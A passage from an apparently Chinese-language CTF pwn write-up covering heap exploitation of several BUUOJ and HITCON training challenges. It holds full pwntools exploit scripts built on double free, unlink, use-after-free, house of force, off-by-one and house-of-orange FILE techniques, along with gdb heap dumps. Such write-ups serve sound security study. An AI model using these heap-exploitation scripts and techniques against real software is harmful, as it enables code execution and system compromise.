sh.sendlineafter(&quot;: &quot;,str(re_sz)) sh.sendlineafter(&quot;: &quot;,re_text)def edit(idx,o_text,re_text): sh.sendlineafter(&quot;:&quot;,&quot;2&quot;) sh.sendlineafter(&quot;: &quot;,str(idx)) sh.sendlineafter(&quot;: &quot;,o_text) sh.sendlineafter(&quot;: &quot;,re_text)def delete(idx): sh.sendlineafter(&quot;:&quot;,&quot;3&quot;) sh.sendlineafter(&quot;: &quot;,str(idx))def show(idx): sh.sendlineafter(&quot;:&quot;,&quot;3&quot;) sh.sendlineafter(&quot;: &quot;,str(idx))def pwn(ip,port,debug,mode): global sh if debug==0: context.log_level = &quot;debug&quot; else: pass if mode==0: sh = process(&quot;./gyctf_2020_some_thing_interesting&quot;) else: sh = remote(ip,port) leak = leak_addr() base = leak-0x20830 one_gadget = 0xf1147+base malloc_hook = base+libc.sym[&quot;__malloc_hook&quot;] success(&quot;base -&gt; 0x%x&quot;,base) success(&quot;one gadget -&gt; 0x%x&quot;,one_gadget) success(&quot;malloc hook -&gt; 0x%x&quot;,malloc_hook) create(0x68,&#x27;aaaa&#x27;,0x68,&#x27;1111&#x27;) #1 create(0x68,&#x27;aaaa&#x27;,0x68,&#x27;1111&#x27;) #2 delete(1) delete(2) delete(1) create(0x68,p64(malloc_hook-35),0x68,&#x27;1111&#x27;) #1 create(0x68,p64(malloc_hook-35),0x68,&#x27;1111&#x27;) #2 create(0x68,p64(malloc_hook-35),0x68,&quot;a&quot;*0x13+p64(one_gadget)) #1 sh.sendlineafter(&quot;:&quot;,&quot;1&quot;) sh.sendlineafter(&quot;: &quot;,&quot;20&quot;) sh.interactive()if __name__ == &#x27;__main__&#x27;: pwn(&quot;node3.buuoj.cn&quot;,29443,1,1) hitcon_2014_stkof 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA 程序太简陋了，几乎没有交互，能用的有三个功能 12345678910111213def add(sz): p.snedline(&quot;1&quot;) p.snedline(str(sz))def edit(chunk,size,strs): p.sendline(&quot;2&quot;) p.sendline(chunk) p.sendline(size) p.sendline(strs)def free(chunk): p.sendline(&quot;3&quot;) p.sendline(chunk) sub_4009E8() edit 12345for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) ) &#123; ptr += i; n -= i; &#125; 没有控制输入范围，可以堆溢出 全局变量s 1234567.bss:0000000000602104 align 40h.bss:0000000000602140 ; char *s[1049600].bss:0000000000602140 s dq ? ; DATA XREF: add+78↑w.bss:0000000000602140 ; edit+60↑r ....bss:0000000000602148 db ? ;.bss:0000000000602149 db ? ;.bss:000000000060214A db ? ; 思路 有堆溢出，有全局指针变量，没有输出函数，所以用unlink改free@got 为 puts，再次调用free就相当于调用puts，从而libc leak 填入onegedget或者该函数为system并执行binsh，从而getshell 3.GDB unlink部份 1234567891011121314151617181920212223#unlink#code: alloc(0x100) # idx 1 alloc(0x30) # idx 2 alloc(0x80) # idx 3 head = 0x602140 #全局变量 #fake chunk payload = p64(0) payload += p64(0x20) payload += p64(head + 16 - 0x18) payload += p64(head + 16 - 0x10) payload += p64(0x20) payload = payload.ljust(0x30, &#x27;a&#x27;) payload += p64(0x30) payload += p64(0x90) edit(2, len(payload), payload) #unlink free(3) p.recvuntil(&#x27;OK\\n&#x27;) gdb.attach(p) gdb 1234567891011121314151617181920212223242526272829303132333435363738394041420x1561000 PREV_INUSE &#123; prev_size = 0, size = 4113, fd = 0xa33, bk = 0x20, fd_nextsize = 0x602138, bk_nextsize = 0x602140&#125;0x1562010 PREV_INUSE &#123; prev_size = 0, size = 273, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x1562120 PREV_INUSE &#123; prev_size = 0, size = 1041, fd = 0xa4b4f, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x1562530 FASTBIN &#123; prev_size = 0, size = 65, fd = 0x0, bk = 0x20ac1, fd_nextsize = 0x602138, bk_nextsize = 0x602140&#125;pwndbg&gt; x/32gx 0x15610000x1561000: 0x0000000000000000 0x00000000000010110x1561010: 0x0000000000000a33 0x0000000000000020 fake fd fake bk0x1561020: 0x0000000000602138 0x00000000006021400x1561030: 0x0000000000000020 0x61616161616161610x1561040: 0x0000000000000030 0x00000000000000900x1561050: 0x0000000000000000 0x00000000000000000x1561060: 0x0000000000000000 0x0000000000000000 4.EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./stkof&quot;)libc = ELF(&#x27;/home/joe1sn/libc/64/libc-2.23.so&#x27;)#p = process(&quot;./stkof&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;25342&quot;)def alloc(size): p.sendline(&#x27;1&#x27;) p.sendline(str(size)) p.recvuntil(&#x27;OK\\n&#x27;)def edit(idx, size, content): p.sendline(&#x27;2&#x27;) p.sendline(str(idx)) p.sendline(str(size)) p.send(content) p.recvuntil(&#x27;OK\\n&#x27;)def free(idx): p.sendline(&#x27;3&#x27;) p.sendline(str(idx))if __name__ == &#x27;__main__&#x27;: alloc(0x100) # idx 1 alloc(0x30) # idx 2 alloc(0x80) # idx 3 head = 0x602140 #global pointer payload = p64(0) #prev_size payload += p64(0x20) #size --&gt; except the first line, the rest two line is equal to 0x20? payload += p64(head + 16 - 0x18) #fd payload += p64(head + 16 - 0x10) #bk payload += p64(0x20) # next chunk&#x27;s prev_size bypass the check payload = payload.ljust(0x30, &#x27;a&#x27;) # overwrite global[3]&#x27;s chunk&#x27;s prev_size # make it believe that prev chunk is at global[2] payload += p64(0x30) #0x30 is the front one whole size? # make it believe that prev chunk is free payload += p64(0x90) edit(2, len(payload), payload) # unlink fake chunk, so global[2] =&amp;(global[2]) - 0x18 = head - 8 free(3) p.recvuntil(&#x27;OK\\n&#x27;) #gdb.attach(p) # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = &#x27;a&#x27; * 8 + p64(elf.got[&#x27;free&#x27;]) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.got[&#x27;atoi&#x27;]) edit(2, len(payload), payload) # edit free@got to puts@plt payload = p64(elf.plt[&#x27;puts&#x27;]) edit(0, len(payload), payload) #free global[1] to leak puts addr free(1) puts_addr = p.recvuntil(&#x27;\\nOK\\n&#x27;, drop=True).ljust(8, &#x27;\\x00&#x27;) puts_addr = u64(puts_addr) log.success(&#x27;puts addr: &#x27; + hex(puts_addr)) libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;] binsh_addr = libc_base + next(libc.search(&#x27;/bin/sh&#x27;)) system_addr = libc_base + libc.symbols[&#x27;system&#x27;] log.success(&#x27;libc base: &#x27; + hex(libc_base)) log.success(&#x27;/bin/sh addr: &#x27; + hex(binsh_addr)) log.success(&#x27;system addr: &#x27; + hex(system_addr)) # modify atoi@got to system addr payload = p64(system_addr) edit(2, len(payload), payload) p.send(p64(binsh_addr)) p.interactive() hitcontraining_uaf Use_After_Free 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA 得到几个选项+后门 1234def add(sz,text): p.sendlineafter(&quot;choice :&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text) 123def dele(idx): p.sendlineafter(&quot;choice :&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) 123def show(idx): p.sendlineafter(&quot;choice :&quot;,&quot;3&quot;) p.sendlineafter(&quot;choice :&quot;,str(idx)) backdoor: 1234int magic()&#123; return system(&quot;cat /home/hacknote/flag&quot;);&#125; free： 123free(*((void **)notelist[v1] + 1)); free(notelist[v1]); puts(&quot;Success&quot;); 这里free后指针未清造成UAF EXP 123456789101112131415161718192021222324252627from pwn import *p = process(&quot;./hacknote&quot;)def addnote(size,content): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(size)) p.sendlineafter(&quot;:&quot;,content)def delnote(idx): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx))def printnote(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx))if __name__ == &#x27;__main__&#x27;: magic = 0x08048986 system = 0x8048506 addnote(32,&quot;ddaa&quot;) addnote(32,&quot;ddaa&quot;) addnote(32,&quot;ddaa&quot;) delnote(0) delnote(1) addnote(8,p32(magic)) printnote(0) p.interactive() hitcontraining_bamboobox Unlink or House_Of_Force checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) IDA 1234def add(length,name): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(length)) p.sendlineafter(&quot;:&quot;,name) 12345def edit(idx,length,name): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(length)) p.sendlineafter(&quot;:&quot;,name) 123def free(idx): p.sendlineafter(&quot;:&quot;,&quot;4&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) 12def show(): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) back_door 12345678910111213void __noreturn magic()&#123; int fd; // ST0C_4 char buf; // [rsp+10h] [rbp-70h] unsigned __int64 v2; // [rsp+78h] [rbp-8h] v2 = __readfsqword(0x28u); fd = open(&quot;/home/bamboobox/flag&quot;, 0); read(fd, &amp;buf, 0x64uLL); close(fd); printf(&quot;%s&quot;, &amp;buf); exit(0);&#125; change_item 123456 printf(&quot;Please enter the length of item name:&quot;, &amp;buf); read(0, &amp;nptr, 8uLL); v0 = atoi(&amp;nptr); printf(&quot;Please enter the new name of the item:&quot;, &amp;nptr); *(_BYTE *)(qword_6020C8[2 * v2] + (signed int)read(0, (void *)qword_6020C8[2 * v2], v0)) = 0;&#125; 堆溢出 **1.unsafe unlink: **对进行 unlink chunk 进行内存布然后借助 unlink 操作来达成修改指针的效果。个人认为通过堆溢出伪造一个chun伪造的chunk一般在fd和bk上不同 **2.house of force: ** 进行堆分配如果所有空闲的块都无法满足需那么就会从 top chunk 中分割出相应的大小作为堆块的空间。 那当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案可以使得 top chunk指向我们期望的任何位这就相当于一次任意地址写。 --CTFWiKi 需要以下条件： 能够以溢出等方式控制到 top chunk 的 size 域 能够自由地控制堆分配尺寸的大小 EXP-1 unlink 原版EXP方便理解所以直接拿来用了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *host = &quot;training.pwnable.tw&quot;port = 11011r = remote(host,port)def additem(length,name): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(length)) r.recvuntil(&quot;:&quot;) r.sendline(name)def modify(idx,length,name): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;:&quot;) r.sendline(str(length)) r.recvuntil(&quot;:&quot;) r.sendline(name)def remove(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def show(): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;)additem(0x40,&quot;a&quot;*8)additem(0x80,&quot;b&quot;*8)additem(0x40,&quot;c&quot;*8)ptr = 0x6020c8fake_chunk = p64(0) #prev_sizefake_chunk += p64(0x41) #sizefake_chunk += p64(ptr-0x18) #fdfake_chunk += p64(ptr-0x10) #bkfake_chunk += &quot;c&quot;*0x20fake_chunk += p64(0x40)#修复fake_chunk += p64(0x90)#修复modify(0,0x80,fake_chunk) #unlinkremove(1)payload = p64(0)*2payload += p64(0x40) + p64(0x602068)modify(0,0x80,payload)show() #libc base leakr.recvuntil(&quot;0 : &quot;)atoi = u64(r.recvuntil(&quot;:&quot;)[:6].ljust(8,&quot;\\x00&quot;))libc = atoi - 0x36e80print &quot;libc:&quot;,hex(libc)system = libc + 0x45390modify(0,0x8,p64(system))r.recvuntil(&quot;:&quot;)r.sendline(&quot;sh&quot;)r.interactive() 这里可以看见我们伪造的堆结构: 12345678ptr = 0x6020c8fake_chunk = p64(0) #prev_sizefake_chunk += p64(0x41) #sizefake_chunk += p64(ptr-0x18) #fdfake_chunk += p64(ptr-0x10) #bkfake_chunk += &quot;c&quot;*0x20fake_chunk += p64(0x40)fake_chunk += p64(0x90) 3.EXP-2 house of force 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *r = process(&quot;./bamboobox&quot;)elf = ELF(&quot;./bamboobox&quot;)def alloc(length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the name of item:&quot;) r.send(context)def edit(idx,length,context): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;Please enter the length of item name:&quot;) r.sendline(str(length)) r.recvuntil(&quot;Please enter the new name of the item:&quot;) r.send(context)def free(idx): r.recvuntil(&quot;Your choice:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;Please enter the index of item:&quot;) r.sendline(str(idx))def show(): r.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)def exit(): r.sendlineafter(&quot;:&quot;, &quot;5&quot;)alloc(0x30,&#x27;aaaa&#x27;)payload=&#x27;a&#x27;*0x30+p64(0)+p64(0xffffffffffffffff) #house of forceedit(0,0x40,payload)magic=elf.sym[&#x27;magic&#x27;]malloc_size = -(0x40 + 0x20)-0x10alloc(malloc_size,&#x27;aaaa&#x27;)alloc(0x10,p64(magic)*2)exit()r.interactive() hitcontraining_magicheap Unsorted_Bin_Attack 控制 Unsorted Bin Chunk 的 bk 指针 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA 1234def add(sz,text): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text) 12345def edit(idx,text): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(len(text))) p.sendlineafter(&quot;:&quot;,str(text)) 123def free(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) back_door 1234int l33t()&#123; return system(&quot;/bin/sh&quot;);&#125; edit_heap 123456printf(&quot;Size of Heap : &quot;, (char *)&amp;v1 + 4, v1); read(0, (char *)&amp;v1 + 4, 8uLL); v2 = atoi((const char *)&amp;v1 + 4); printf(&quot;Content of heap : &quot;, (char *)&amp;v1 + 4, v1); read_input(heaparray[(signed int)v1], v2); return puts(&quot;Done !&quot;); 未控制边堆溢出 3.EXP 123456789101112131415161718192021222324252627282930313233343536from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./magicheap&quot;)libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)p = process(&quot;./magicheap&quot;)#p = remote(&quot;node3.buuoj.cn&quot;,&quot;25535&quot;)def add(sz,text): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(sz)) p.sendlineafter(&quot;:&quot;,text)def edit(idx,text): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,str(len(text))) p.sendlineafter(&quot;:&quot;,str(text))def free(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx))l33t = 0x6020A0if __name__ == &#x27;__main__&#x27;: add(0x60,&#x27;aaaa&#x27;) add(0x60,&#x27;aaaa&#x27;) add(0x60,&#x27;aaaa&#x27;) free(2) edit(1,&#x27;a&#x27;*0x60+p64(0)+p64(0x71)+p64(l33t-0x13)) #&lt;--控制bk指针 add(0x60,&#x27;aaaa&#x27;) #2 add(0x60,&#x27;aaaa&#x27;) #3 fake_chunk edit(3,&#x27;a&#x27;*8) p.sendlineafter(&quot;:&quot;,str(0x1305)) p.interactive() 为什么是p64(l33t-0x13)？ 经过动态调试得该处是unsorted bin链表 为什么edit(3,‘a’*8)？ 覆写magic的值为‘0x6161616161616161从而进入后门 hitcontraining_heapcreator Off_By_One 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA 日常增删查改 1234def add(size,content): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(size)) p.sendlineafter(&quot;:&quot;,content) 1234def edit(idx,content): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,content) 123def show(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) 123def delete(idx): p.sendlineaftr(&quot;:&quot;,&quot;4&quot;) p.sendline(&quot;:&quot;,str(idx)) edit 123printf(&quot;Content of heap : &quot;, &amp;buf); read_input(*((_QWORD *)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL); puts(&quot;Done !&quot;); 人为的多读取了一个字节(off by one使得我们可以控制下一个chunk的size,再得到`libc base 最后改free为system 3.EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./heapcreator&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#p = process(&quot;./heapcreator&quot;)p = remote(&quot;node3.buuoj.cn&quot;,29082)def add(size,content): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(size)) p.sendlineafter(&quot;:&quot;,content)def edit(idx,content): p.sendlineafter(&quot;:&quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) p.sendlineafter(&quot;:&quot;,content)def show(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx))def delete(idx): p.sendlineaftr(&quot;:&quot;,&quot;4&quot;) p.sendline(&quot;:&quot;,str(idx))if __name__ == &#x27;__main__&#x27;: add(0x18,&#x27;aaaa&#x27;) add(0x18,&#x27;aaaa&#x27;) #gdb.attach(p) edit(0,&#x27;/bin/sh\\x00&#x27;+&#x27;a&#x27;*0x10+&#x27;\\x41&#x27;) #&lt;-off by one #gdb.attach(p) delete(1) #gdb.attach(p) add(0x30,p64(0)*4+p64(0x30)+p64(elf.got[&quot;free&quot;])) #gdb.attach(p) show(1) leak=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;)) base=leak-libc.sym[&quot;free&quot;] sys_addr = base+libc.sym[&quot;system&quot;] log.success(&quot;leak addr=&gt;0x%x&quot;,leak) log.success(&quot;libc base=&gt;0x%x&quot;,base) log.success(&quot;system addr=&gt;0x%x&quot;,sys_addr) edit(1,p64(sys_addr)) delete(0) p.interactive() hitcontraining_secret_garden Double_Free 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA 原来的菜单有很多无用的函有用的就两个 12345def create(lenght,name,color): p.sendlineafter(&quot;:&quot;,&#x27;1&#x27;) p.sendlineafter(&quot;:&quot;,str(lenght)) p.sendlineafter(&quot;:&quot;,name) p.sendlineafter(&quot;:&quot;,color) 123def delete(idx): p.sendlineafter(&quot;:&quot;,&#x27;3&#x27;) p.sendlineafter(&quot;:&quot;,str(idx)) back_door 1234int magic()&#123; return system(&quot;/bin/sh&quot;);&#125; 3.EXP 原版EXP 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *host = &quot;training.pwnable.tw&quot;port = 11012#r = remote(host,port)r = process(&quot;./secretgarden&quot;)def raiseflower(length,name,color): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(length)) r.recvuntil(&quot;:&quot;) r.sendline(name) r.recvuntil(&quot;:&quot;) r.sendline(color)def visit(): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;)def remove(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def clean(): r.recvuntil(&quot;:&quot;) r.sendline(&quot;4&quot;)magic = 0x400c7bfake_chunk = 0x601ffaraiseflower(0x50,&quot;da&quot;,&quot;red&quot;)raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)remove(0)remove(1)remove(0)raiseflower(0x50,p64(fake_chunk),&quot;blue&quot;)raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)raiseflower(0x50,&quot;a&quot;*6 + p64(0) + p64(magic)*2 ,&quot;red&quot;)r.interactive() houseoforange_hitcon_2016 checksec 123456Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledFORTIFY: Enabled 保护全开 IDA 123puts(&quot; 1. Build the house &quot;);puts(&quot; 2. See the house &quot;);puts(&quot; 3. Upgrade the house &quot;); 没有 free 相关函数 build 12345if ( unk_203070 &gt; 3u ) &#123; puts(&quot;Too many house&quot;); exit(1); &#125; 最多只能有3个橘子 1234567891011v3 = malloc(0x10uLL); // 存储house大小printf(&quot;Length of name :&quot;);size = made_choice();if ( size &gt; 0x1000 ) size = 0x1000;v3[1] = malloc(size);if ( !v3[1] )&#123; puts(&quot;Malloc error !!!&quot;); exit(1);&#125; 最多可以申请 0x1000大小的chunk 12345678910111213141516printf(&quot;Color of Orange:&quot;); size_4 = made_choice(); if ( size_4 != 0xDDAA &amp;&amp; (size_4 &lt;= 0 || size_4 &gt; 7) ) &#123; puts(&quot;No such color&quot;); exit(1); &#125; if ( size_4 == 0xDDAA ) v4[1] = 0xDDAA; else v4[1] = size_4 + 30; *(_QWORD *)v3 = v4; house_idx = v3; ++unk_203070; return puts(&quot;Finish&quot;);&#125; 发现 color 可以变为（1&lt;x&lt;=7）|| x=0xDDAA，这里可能是突破口 upgrade 12if ( unk_203074 &gt; 2u ) return puts(&quot;You can&#x27;t upgrade more&quot;); 只能使用两次 1234567891011121314151617181920212223printf(&quot;Length of name :&quot;);v2 = made_choice();if ( v2 &gt; 0x1000 ) v2 = 0x1000;printf(&quot;Name:&quot;);safe_read((void *)house_name[1], v2);printf(&quot;Price of Orange: &quot;, v2);v1 = (_DWORD *)*house_name;*v1 = made_choice();colorful(); printf(&quot;Color of Orange: &quot;);v3 = made_choice();if ( v3 != 0xDDAA &amp;&amp; (v3 &lt;= 0 || v3 &gt; 7) )&#123; puts(&quot;No such color&quot;); exit(1);&#125;if ( v3 == 0xDDAA ) *(_DWORD *)(*house_name + 4LL) = 0xDDAA;else *(_DWORD *)(*house_name + 4LL) = v3 + 30;++unk_203074;return puts(&quot;Finish&quot;); 同样可以申请 0x1000大小的chunk之类的操作，可以堆溢出 思路 1.修改top_chunk的size 2.触发sysmalloc中的_int_free 3.泄露libc和heap的地址 4.触发异常 gdb 0x1 修改top_chunk的size 申请一个house，结构为 1234567891011121314#codeadd(0x30,&#x27;a&#x27;*8)#gdbgef➤ x/32gx 0x5565938710000x556593871000: 0x0000000000000000 0x00000000000000210x556593871010: 0x0000556593871070 0x00005565938710300x556593871020: 0x0000000000000000 0x00000000000000410x556593871030: 0x0000000a61616161 0x00000000000000000x556593871040: 0x0000000000000000 0x00000000000000000x556593871050: 0x0000000000000000 0x00000000000000000x556593871060: 0x0000000000000000 0x00000000000000210x556593871070: 0x000000210000000a 0x00000000000000000x556593871080: 0x0000000000000000 0x0000000000020f81。。。。。。。。 。。。。。。。。。。。 。。。。。。。。。。 覆盖掉 top chunk size域的payload为 payload = 'a'*0x30+p64(0)+p64(0x21)+'a'*0x10+p64(0)+p64(0xf81) 这样就将 top_chunk-&gt;szie = 0x1fc0 1234567890x56222cc84000: 0x0000000000000000 0x00000000000000210x56222cc84010: 0x000056222cc84070 0x000056222cc840300x56222cc84020: 0x0000000000000000 0x00000000000000410x56222cc84030: 0x6161616161616161 0x6161616161616161.............. .................. ..................0x56222cc84060: 0x0000000000000000 0x00000000000000210x56222cc84070: 0x0000002100000006 0x61616161616161610x56222cc84080: 0x0000000000000000 0x0000000000000f810x56222cc84090: 0x0000000000000000 0x0000000000000000 修改成功 0x2 触发sysmalloc中的_int_free 成功修改 top chunk,下一步只要我们申请一块 topchunk 大小不满足的chunk即可，由之前的分析可知我们最大可以申请 0x1000 的空间，那么 add(0x1000,'b'*8) 12345678Chunk(addr=0x564081bf1010, size=0x20, flags=PREV_INUSE)Chunk(addr=0x564081bf1030, size=0x40, flags=PREV_INUSE)Chunk(addr=0x564081bf1070, size=0x20, flags=PREV_INUSE)Chunk(addr=0x564081bf1090, size=0x20, flags=PREV_INUSE)Chunk(addr=0x564081bf10b0, size=0x20, flags=PREV_INUSE)Chunk(addr=0x564081bf10d0, size=0xf20, flags=PREV_INUSE)Chunk(addr=0x564081bf1ff0, size=0x10, flags=)Chunk(addr=0x564081bf2000, size=0x10, flags=PREV_INUSE) top_chunk消失了 123[+] unsorted_bins[0]: fw=0x564081bf10c0, bk=0x564081bf10c0 → Chunk(addr=0x564081bf10d0, size=0xf20, flags=PREV_INUSE)[+] Found 1 chunks in unsorted bin. 成功加入 unsroted bins ,相当于 free 掉了top chunk 0x3 泄露libc和heap的地址 下从 unsorted bins 中取出一点下来用 因为原来有输出的功能，那么我们使用它输出刚才的那个chunk 1234567891011121314151617181920212223#code: add(0x400,&#x27;c&#x27;*8) see() leak = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;)) log.success(&quot;leak add =&gt; 0x%x&quot;,leak) gdb.attach(p)#输出[+] leak add =&gt; 0x7f5cf839a10a#gdb0x5584c45e30e0 PREV_INUSE &#123; prev_size = 0, size = 1041, fd = 0x6363636363636363, bk = 0x7f5cf839a10a &lt;main_arena+1514&gt;, fd_nextsize = 0x5584c45e30e0, bk_nextsize = 0x5584c45e30e0&#125;vmmap 0x5584c45e3000 0x5584c4626000 rw-p 43000 0 [heap] 0x7f5cf7fd5000 0x7f5cf8195000 r-xp 1c0000 0 /lib/x86_64-linux-gnu/libc-2.23.so 0x7f5cf8195000 0x7f5cf8395000 ---p 200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7f5cf8395000 0x7f5cf8399000 r--p 4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7f5cf8399000 0x7f5cf839b000 rw-p 2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so 如果知道是知道libc2.23的话 12&gt;&gt;&gt; hex(0x7f5cf839a10a-0x7f5cf7fd5000-1514)&#x27;0x3c4b20&#x27; 不知道的话直接加减 12&gt;&gt;&gt; hex(0x7f5cf839a10a-0x7f5cf7fd5000)&#x27;0x3c510a&#x27; 同理可知 heap_base 开始泄露，但是要泄露什么？这里泄露的东西就决定了我们攻击的方式 这道题保护全开，之前的方法好像不太行，想起之前的文章FILE结构 那我们可以伪造出一个file，通过修改 vtable 指针来调用 system那么就需要 12345libc_base = leak-0x3c510asystem_addr = libc_base+libc.sym[&quot;system&quot;]binsh = libc_base+libc.search(&quot;/bin/sh\\x00&quot;).next()IO_list_all = libc_base+libc.sym[&quot;_IO_list_all&quot;]IO_str_jumps = libc.symbols[&quot;_IO_file_jumps&quot;]+0xc0+libc_base 0x4 开始构造 fake file ptr_vtable指向伪造的vtable处，vtable[3]为IO_overflow函数地址，将vtable[3]伪造为system地址， 如果再进入build_house函数，进行malloc(0x10)，由于0x10&lt;=2*SIZE_SZ，就会触发malloc_printerr，会遍历IO_llist_all，通过chain找到最终伪造的在old top chunk处的_IO_FILE，然后找到vtable，最终调用 IO_overflow函数 调用IO_overflow时会传入_IO_FILE结构指针作为参数，将old top chunk处伪造的_IO_FILE的前几个字节修改为/bin/sh\\x00 即最终调用为system(‘/bin/sh’) 2016 ctf-HITCON——houseoforange FILE结构 12345678910111213141516171819202122232425262728293031323334353637struct _IO_FILE&#123; int _flags; /* 高阶版本也叫作 _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ char *_IO_read_ptr; /* Current read pointer */ char *_IO_read_end; /* End of get area. */ char *_IO_read_base; /* Start of putback+get area. */ //read char *_IO_write_base; /* Start of put area. */ char *_IO_write_ptr; /* Current put pointer. */ char *_IO_write_end; /* End of put area. */ //write char *_IO_buf_base; /* Start of reserve area. */ char *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain;//通过这个域创造链表 int _fileno; int _flags2; __off_t _old_offset; /* This used to be _offset but it&#x27;s too small. */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char 